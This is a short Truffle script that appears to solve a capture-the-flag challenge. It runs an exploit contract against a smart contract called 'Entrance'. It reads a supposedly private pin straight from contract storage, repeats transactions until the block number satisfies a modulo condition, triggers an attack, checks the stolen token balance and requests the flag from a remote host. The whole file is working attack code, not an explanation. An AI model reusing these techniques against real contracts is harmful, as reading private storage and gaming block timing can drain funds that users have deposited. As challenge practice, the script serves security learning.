const Entrance = artifacts.require("Entrance");
const EntranceExploit = artifacts.require("EntranceExploit");

let times = (n, f) => { while (n --> 0) f(); }
let sleep = (ms) => { return new Promise(resolve => setTimeout(resolve, ms)); }

module.exports = async function(callback) {
  let entrance = await Entrance.deployed();
  let exploit = await EntranceExploit.deployed();

  let pin = await web3.eth.getStorageAt(entrance.address, 2);
  console.log("Pin: ", pin);

  while (true) {
    let tx = await exploit.enter(pin);
    if (tx.receipt.blockNumber % 7 == 6) {
      break;
    }
  }

  console.log(await exploit.attack());
  console.log((await entrance.balanceOf(exploit.address)).toNumber());
  console.log(await exploit.getFlag("37.235.60.56", "1234"));
}

